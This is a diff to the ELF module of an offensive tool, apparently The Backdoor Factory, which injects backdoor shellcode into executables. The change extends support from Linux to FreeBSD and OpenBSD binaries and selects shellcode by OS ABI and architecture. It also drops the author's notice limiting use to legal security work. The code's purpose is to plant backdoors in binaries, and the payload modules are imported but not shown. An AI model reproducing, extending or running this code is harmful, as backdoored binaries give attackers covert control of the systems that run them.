@@ -1,36 +1,44 @@
 #!/usr/bin/env python
 '''
 
-    Author Joshua Pitts the.midnite.runr 'at' gmail <d ot > com
+Copyright (c) 2013-2014, Joshua Pitts
+All rights reserved.
 
-    Copyright (C) 2013,2014, Joshua Pitts
+Redistribution and use in source and binary forms, with or without modification,
+are permitted provided that the following conditions are met:
 
-    License:   GPLv3
+    1. Redistributions of source code must retain the above copyright notice,
+    this list of conditions and the following disclaimer.
 
-    This program is free software: you can redistribute it and/or modify
-    it under the terms of the GNU General Public License as published by
-    the Free Software Foundation, either version 3 of the License, or
-    (at your option) any later version.
+    2. Redistributions in binary form must reproduce the above copyright notice,
+    this list of conditions and the following disclaimer in the documentation
+    and/or other materials provided with the distribution.
 
-    This program is distributed in the hope that it will be useful,
-    but WITHOUT ANY WARRANTY; without even the implied warranty of
-    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-    GNU General Public License for more details.
+    3. Neither the name of the copyright holder nor the names of its contributors
+    may be used to endorse or promote products derived from this software without
+    specific prior written permission.
 
-    See <http://www.gnu.org/licenses/> for a copy of the GNU General
-    Public License
-
-    Currently supports win86/64 PE and linux86/64 ELF only(intel architecture).
-    This program is to be used for only legal activities by IT security
-    professionals and researchers. Author not responsible for malicious
-    uses.
+THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
+AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
+IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
+ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
+LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
+CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
+SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
+INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
+CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
+ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
+POSSIBILITY OF SUCH DAMAGE.
 
 '''
+
 import struct
 import os
 import shutil
 from intel.LinuxIntelELF32 import linux_elfI32_shellcode
 from intel.LinuxIntelELF64 import linux_elfI64_shellcode
+from intel.FreeBSDIntelELF32 import freebsd_elfI32_shellcode
+from intel.FreeBSDIntelELF64 import freebsd_elfI64_shellcode
 
 
 class elf():
@@ -105,14 +113,28 @@ class elfbin():
                                  [0x03,  # x86
                                   0x3E   # x64
                                   ]],
-                                0x03:   # linux
+                                0x03:    # Linux
                                 [[0x01,  # 32bit
                                   0x02   # 64bit
                                   ],
                                  [0x03,  # x86
                                   0x3E   # x64
                                   ]],
-                                }
+				                0x09:    # FreeBSD
+                                [[0x01,  # 32bit
+                                  0x02   # 64bit
+                                  ],
+                                 [0x03,  # x86
+                                  0x3E   # x64
+                                  ]],
+                                0x0C:    # OpenBSD
+                                [[0x01,  # 32bit
+                                  0x02   # 64bit
+                                  ],
+                                 [0x03,  # x86
+                                  0x3E   # x64
+                                 ]]       
+                               }
 
     def run_this(self):
         '''
@@ -218,12 +240,27 @@ class elfbin():
         This function sets the shellcode.
         """
         print "[*] Setting selected shellcode"
-        #x86
-        if self.EI_CLASS == 0x1 and self.e_machine == 0x03:
-            self.bintype = linux_elfI32_shellcode
-        #x64
-        if self.EI_CLASS == 0x2 and self.e_machine == 0x3E:
-            self.bintype = linux_elfI64_shellcode
+        '''
+        Going to need to base the identification of the binaries
+        based on e_machine and e_ident['EI_OSABI'].  Right now it is 
+        too simple as it is based off of e_machine and EI_CLASS and 
+
+        '''
+
+        self.bintype = False
+        if self.e_machine == 0x03:  # x86 chipset
+            if self.EI_CLASS == 0x1:
+                if self.EI_OSABI == 0x00:
+                    self.bintype = linux_elfI32_shellcode
+                elif self.EI_OSABI == 0x09:
+                    self.bintype = freebsd_elfI32_shellcode
+        elif self.e_machine == 0x3E: # x86-64 chipset    
+            if self.EI_CLASS == 0x2:
+                if self.EI_OSABI == 0x00:
+                    self.bintype = linux_elfI64_shellcode
+                elif self.EI_OSABI == 0x09:
+                    self.bintype = freebsd_elfI64_shellcode
+
         if not self.SHELL:
             print "You must choose a backdoor to add: "
             for item in dir(self.bintype):
@@ -287,12 +324,11 @@ class elfbin():
         if self.bin_file.read(4) == elf.e_ident["EI_MAG"]:
             self.bin_file.seek(4, 0)
             self.class_type = struct.unpack("<B", self.bin_file.read(1))[0]
-
             self.bin_file.seek(7, 0)
-            self.sys_type = struct.unpack("<B", self.bin_file.read(1))[0]
+            self.EI_OSABI = struct.unpack("<B", self.bin_file.read(1))[0]
             self.supported = False
             for system_type in self.supported_types.iteritems():
-                if self.sys_type == system_type[0]:
+                if self.EI_OSABI == system_type[0]:
                     print "[*] System Type Supported:", elf.e_ident["EI_OSABI"][system_type[0]]
                     if self.class_type == 0x1 and (self.IMAGE_TYPE == 'ALL' or self.IMAGE_TYPE == 'x86'):
                         self.supported = True
@@ -499,6 +535,7 @@ class elfbin():
         self.gather_file_info()
         resultShell = self.set_shells()
         if resultShell is False:
+            print "[!] Could not set shell"
             return False
         self.bin_file = open(self.backdoorfile, "r+b")
 
